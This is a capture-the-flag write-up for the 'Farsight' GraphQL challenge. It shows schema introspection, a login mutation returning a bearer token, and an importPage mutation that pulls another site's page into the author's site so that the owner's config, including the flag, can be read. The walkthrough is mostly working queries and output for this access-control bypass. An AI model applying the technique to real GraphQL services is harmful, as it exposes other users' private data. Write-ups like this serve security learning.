# Farsight

---

### GraphQL Endpoint

```jsx
https://web-farsight-5d33593f.chal-2021.duc.tf/graphql
```

### Get schemas query

```jsx
{__schema{types{name,fields{name}}}}
```

### Schemas

```jsx
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "username"
            },
            {
              "name": "sites"
            }
          ]
        },
        {
          "name": "ID",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Site",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "name"
            },
            {
              "name": "pages"
            },
            {
              "name": "public"
            },
            {
              "name": "owner"
            },
            {
              "name": "config"
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "ConfigPair",
          "fields": [
            {
              "name": "key"
            },
            {
              "name": "value"
            }
          ]
        },
        {
          "name": "Page",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "name"
            },
            {
              "name": "content"
            },
            {
              "name": "ownerSite"
            },
            {
              "name": "siteRefs"
            }
          ]
        },
        {
          "name": "Query",
          "fields": [
            {
              "name": "me"
            },
            {
              "name": "site"
            }
          ]
        },
        {
          "name": "Mutation",
          "fields": [
            {
              "name": "loginOrRegister"
            },
            {
              "name": "newPage"
            },
            {
              "name": "setSiteConfig"
            },
            {
              "name": "importPage"
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description"
            },
            {
              "name": "types"
            },
            {
              "name": "queryType"
            },
            {
              "name": "mutationType"
            },
            {
              "name": "subscriptionType"
            },
            {
              "name": "directives"
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "specifiedByUrl"
            },
            {
              "name": "fields"
            },
            {
              "name": "interfaces"
            },
            {
              "name": "possibleTypes"
            },
            {
              "name": "enumValues"
            },
            {
              "name": "inputFields"
            },
            {
              "name": "ofType"
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "args"
            },
            {
              "name": "type"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "type"
            },
            {
              "name": "defaultValue"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isRepeatable"
            },
            {
              "name": "locations"
            },
            {
              "name": "args"
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        }
      ]
    }
  }
}
```

We can login or register with this mutation, although it really isn't necessary.

```jsx
mutation{ loginOrRegister(username:"k0z", password:"password") }
```

Once we query with this, we receive the Bearer token... We need to use this so we are authorized.

```jsx
{
  "data": {
    "loginOrRegister": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU4LCJpYXQiOjE2MzI1NzE0NTF9.HhIR_5qldAnGbD8RmfhSYhgHmB_y-G_g_7UXhLVVluU"
  }
}
```

Once adding the Authorization bearer token to our header, we can get any post we like. We do need to get our ID from the account we made though, we can just go to the website and login to get this as it will be in the URL.

```jsx
mutation{importPage(pageId:"0", siteId:"43")}
```

Now if we send the following query, we can see that we have grabbed the owners content / have the owners site ID.

```jsx
query site{site(id:"43") {pages {id name content ownerSite{id}} }}
```

```jsx
{
  "data": {
    "site": {
      "pages": [
        {
          "id": "0",
          "name": "Flags and Configurations",
          "content": "# Flags and configurations\\n\\nThere might be something interesting in the configuration for this site `;)`",
          "ownerSite": {
            "id": "0"
          }
        }
      ]
    }
  }
}
```

We can now also get their config!

```jsx
query site{site(id:"43") {pages {id name ownerSite{id config{ key , value}}} }}
```

```jsx
{
  "data": {
    "site": {
      "pages": [
        {
          "id": "0",
          "name": "Flags and Configurations",
          "ownerSite": {
            "id": "0",
            "config": [
              {
                "key": "color",
                "value": "red"
              },
              {
                "key": "background",
                "value": "#eeffcc"
              },
              {
                "key": "flag",
                "value": "DUCTF{5h0wINg_S3cREt_sch3m4S_spR1nGs_SITe_sUPeRVi5I0N_Sid3STeP-bdcf8179}"
              }
            ]
          }
        }
      ]
    }
  }
}
```

Now we have the flag!
